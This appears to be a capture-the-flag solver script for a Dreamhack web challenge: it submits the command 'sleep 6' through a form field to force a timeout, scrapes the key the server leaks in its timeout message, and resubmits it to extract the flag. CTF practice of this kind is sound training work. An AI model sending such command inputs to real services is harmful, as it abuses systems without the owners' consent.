import requests
import re
from bs4 import BeautifulSoup

url = "http://host3.dreamhack.games:20378/flag"

data = {
    'cmd_input': 'sleep 6'
}

res = requests.post(url, data=data)
soup = BeautifulSoup(res.text, 'html.parser')
pres = soup.find_all('pre')

key = pres[0].get_text().replace('Timeout! Your key: ', '')

res = requests.post(url, data={'key': key})

match = re.search(r'DH\{[^<]*\}', res.text)
print(match.group(0))
